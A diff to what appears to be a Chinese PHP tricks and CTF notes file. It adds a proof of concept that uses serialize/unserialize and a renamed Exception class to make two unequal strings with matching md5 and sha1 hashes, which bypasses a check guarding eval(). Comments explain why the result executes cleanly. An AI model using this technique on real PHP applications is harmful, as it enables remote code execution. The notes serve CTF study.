@@ -423,6 +423,72 @@ md5($var,true)会返回一个原始的二进制数据，某些数据会被当成
    >129581926211651571912466741651878684928
    >ffifdyop
 
+3. 杂
+
+```php
+<?php
+
+
+class Exceptiop{
+	protected  $message ;
+	protected  $code ;
+	protected  $file ;
+	protected  $line ;
+	public function __construct($mess,$file){
+			$this->message = $mess;
+			$this->code = 1;
+		    $this->file = $file;
+		    $this->line = 1;
+	}
+
+
+}
+
+class WTF {
+        public $var3;
+		function __construct(){
+			$evalcode = "echo 123; __HALT_COMPILER();";
+			$this->var1 = new Exceptiop($evalcode,"in b");
+			$this->var2 = new Exceptiop($evalcode." in","b");
+
+		}
+        function __destruct(){
+            var_dump(md5($this->var1));
+            var_dump(md5($this->var2));
+            echo $this->var1;
+            echo "next:<br>";
+            echo $this->var2;
+            if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1)=== sha1($this->var2)) ){
+            	  eval($this->var1);
+			}
+        }
+    }
+
+$t = new WTF();
+$t1 = str_replace("Exceptiop","Exception",serialize($t));
+$dd = unserialize($t1);
+/*
+$dd->var1的结果如下
+
+Exception: echo 123; __HALT_COMPILER(); in in b:1
+Stack trace:
+#0 /Users/wupco/Desktop/php/nexp.php(38): unserialize('O:3:"WTF":3:{s:...')
+#1 {main}
+
+*/
+
+/*
+
+比较巧的是`Exception:`刚好被当成goto的label,
+`__HALT_COMPILER()`又会终止对后面的代码的转换
+所以是非常纯净的eval，不过也可以注入`?><?php`来做
+
+*/
+
+?>
+
+```
+
 
 
 ### strcmp
